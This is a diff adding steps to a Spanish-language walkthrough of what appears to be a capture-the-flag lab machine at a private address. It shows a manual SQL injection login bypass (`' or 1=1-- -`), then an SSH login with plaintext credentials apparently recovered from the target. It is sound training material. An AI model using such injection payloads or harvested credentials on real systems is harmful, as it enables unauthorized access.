@@ -53,4 +53,19 @@ dirb http://192.168.25.138
 ![6](https://user-images.githubusercontent.com/75953873/178129075-842d66d2-e997-45c6-8cce-84d712f3c0db.png)
 
 - *Paso 4:* Inyección SQL manual.
+
 En el panel de login se debe ingresar el usuario `john` y la contraseña `' or 1=1-- -`.
+
+![7](https://user-images.githubusercontent.com/75953873/178129163-cf68f241-8cbb-4d11-ac2a-50263173b630.png)
+
+- *Paso 5:* Conectarse al servidor SSH.
+```
+ssh -oHostKeyAlgorithms=+ssh-dss john@192.168.25.138 -l john
+```
+
+Usuario: `john`
+
+Contraseña: `MyNameIsJohn`
+
+![8](https://user-images.githubusercontent.com/75953873/178129218-e0862b3b-4d30-44b2-8352-cc0e39f5d10c.png)
+
